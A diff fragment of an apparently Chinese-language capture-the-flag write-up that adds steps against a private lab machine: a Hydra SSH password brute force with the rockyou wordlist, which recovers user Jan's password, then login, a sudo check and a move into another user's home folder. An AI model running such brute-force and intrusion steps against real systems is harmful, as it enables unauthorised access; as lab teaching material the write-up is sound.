@@ -11,4 +11,12 @@
 ![image](https://github.com/Superliverbun/My-CTF-Challenges/assets/113052517/934b796a-fdba-4e40-9714-ea289b312fed)
 (得到兩個使用者帳號 Kay 和 Jan)<br/>
 (Jan 權限較低，較好攻擊)<br/>
+**kali>**  <code>hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.203.132 ssh</code> (破解密碼)<br/>
+(得到帳號jan的密碼：armando)<br/>
+**kali>** <code>ssh jan@192.168.203.132</code>(連線到jan的帳號)<br/>
+**Jan>** <code>sudo -l</code>(測試我的權限)(發現權限不足，改入侵kay)<br/>
+**Jan>** <code>pwd</code>(查看我在哪裡)<br/>
+**Jan>** <code>cd ..</code><br/>
+**Jan>** <code>ls -al</code><br/>
+**Jan>** <code>cd /home/kay</code>(移動到kay的檔案夾下)<br/>
 
